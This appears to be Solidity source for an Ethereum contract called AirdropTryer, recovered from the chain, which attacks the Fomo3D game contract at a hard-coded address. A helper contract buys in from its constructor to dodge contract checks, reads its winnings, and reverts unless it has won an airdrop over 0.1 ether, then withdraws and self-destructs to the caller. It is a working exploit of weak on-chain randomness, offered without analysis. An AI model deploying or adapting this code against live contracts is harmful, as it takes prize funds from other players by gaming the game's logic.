/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract AirdropTryer at 0x47a169eda4a057569903a882ee15b8c5472a6faa
*/
pragma solidity ^0.4.6;
pragma solidity ^0.4.24;

contract fomo3d {
    function getPlayerInfoByAddress(address _addr)
        public 
        view 
        returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256);
        
    function withdraw()
        public;
        
}

contract giveAirdrop {

    constructor () public payable {
        // Instantiate fomo3d contract
        fomo3d fomo = fomo3d(address(0xA62142888ABa8370742bE823c1782D17A0389Da1));
        
        // Buy in
        require(address(0xA62142888ABa8370742bE823c1782D17A0389Da1).call.value(msg.value)());
        
        // Check to see if we won an airdrop
        (,,,uint winnings,,,) = fomo.getPlayerInfoByAddress(address(this));
        require(winnings > 0.1 ether);
        fomo.withdraw();
        
        selfdestruct(msg.sender);
    }
    
    // Accept ETH
    function () public payable {}
}

contract AirdropTryer {

  address owner;
  giveAirdrop airdropper;


  constructor () public {
    owner = msg.sender;
  }

  function tryAirdrop() public payable{
    airdropper = (new giveAirdrop).value(msg.value)();
  }
  
  function empty() public {
      require(msg.sender == owner);
      selfdestruct(owner);
  }
}